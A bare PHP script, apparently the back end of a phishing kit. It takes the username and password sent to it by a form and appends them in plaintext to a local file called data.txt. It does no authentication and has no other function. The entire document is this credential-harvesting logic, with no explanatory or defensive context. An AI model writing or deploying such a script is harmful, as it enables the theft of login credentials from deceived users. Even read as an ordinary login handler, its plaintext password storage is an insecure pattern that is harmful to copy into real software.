<?php

$username =trim($_POST['username']);
$password =trim($_POST['password']);

$fp = fopen('data.txt','a');
fwrite($fp,"username: {$username} \n");
fwrite($fp,"password:  {$password} \n");
fwrite($fp,"---------------  \n");
fclose($fp);
